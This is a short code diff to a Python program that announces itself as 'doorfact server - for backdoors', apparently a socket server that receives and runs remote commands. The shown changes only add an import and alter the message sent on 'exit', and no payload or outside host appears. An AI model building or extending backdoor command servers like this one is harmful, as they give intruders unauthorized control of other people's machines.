@@ -34,6 +34,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 
 import socket
 import subprocess
+import sys
 
 print("doorfact server - for backdoors")
 
@@ -78,7 +79,7 @@ def main():
 			print(f"$ {recv_command.decode()}") # debug purpose
 
 			if recv_command.decode().lower() == "exit":
-				conn.sendall("Session closed.".encode())
+				conn.sendall("sesclosed".encode())
 				print("Session closed by exit command. Exiting...")
 				sys.exit(0)
 
